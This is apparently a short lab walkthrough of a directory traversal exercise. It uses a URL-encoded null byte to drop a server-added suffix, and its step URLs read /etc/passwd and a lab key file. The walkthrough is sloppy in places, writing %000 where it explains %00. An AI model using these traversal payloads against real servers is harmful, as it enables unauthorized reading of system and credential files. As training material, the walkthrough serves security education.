Directory Traversal 03

This example is based on a common problem when you exploit directory traversal: the server-side code adds its own suffix to your payload. 
This can be easily bypassed, by using a NULL BYTE (which you need to URL-encode as %00).
 Using NULL BYTE to get rid of any suffix added by the server-side code is a common bypass, and works really well in Perl and older versions of PHP.

  You can access this exercise using the following URL: http://ptc-455f5eb4-06e86fde.libcurl.so/. 

Steps:
        1)      Visit the given url: http://ptc-455f5eb4-06e86fde.libcurl.so/. 
        2)      We can see image in the page now open image in new tab. We can see: http://ptc-455f5eb4-06e86fde.libcurl.so/file.php?file=hacker
        3)      Now replace the hacker.png with  /etc/passwd some parameter changes:
                http://ptc-455f5eb4-06e86fde.libcurl.so/file.php?file=../../../../etc/passwd
                But it don't works. So we need to encode the url as %000 (Null byte)
                It seems as:
                http://ptc-455f5eb4-06e86fde.libcurl.so/file.php?file=../../../../etc/passwd%000
        4)      Now replace /etc/password with /pentesterlab.key. 
                http://ptc-455f5eb4-06e86fde.libcurl.so/file.php?file=../../../../pentesterlab.key%000
                And the key is: 66c0e79b-66e2-449a-84b2-ebf044aa82e0.
        5)      Bravo!! you have finished this exercise! 

                Happy Hacking!! :)
